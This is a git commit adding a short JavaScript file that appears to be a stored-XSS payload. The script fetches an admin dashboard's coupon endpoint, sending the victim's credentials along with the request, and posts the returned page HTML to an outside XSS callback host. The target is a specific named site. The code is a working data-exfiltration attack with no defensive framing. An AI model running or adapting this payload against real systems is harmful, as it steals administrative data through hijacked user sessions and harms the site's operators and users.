e4571abfcf6a4ae35c4189635d19ca124a0c9be1
Ahmad-Agbaria <39503965+Ahmad-Agbaria@users.noreply.github.com>
2022-03-15 21:15:01 +0200

    Add files via upload

---
+++ haat_cop.js
@@ -0,0 +1,24 @@
+var xhr = new XMLHttpRequest();
+
+xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/get_coupons?couponType=3&_=1647369395138', true);
+
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+	if (xhr.readyState == 4) {
+		var http = new XMLHttpRequest();
+		var url = "https://mostashio2017.xss.ht/page_callback";
+		http.open("POST", url, true);
+		http.setRequestHeader("Content-type", "text/plain");
+		http.onreadystatechange = function() {
+			if (http.readyState == 4 && http.status == 200) {
+
+			}
+		};
+		page_data = {
+			"page_html": xhr.responseText,
+			"uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_coupons'
+		};
+		http.send(JSON.stringify(page_data));
+	}
+};
+xhr.send(null);
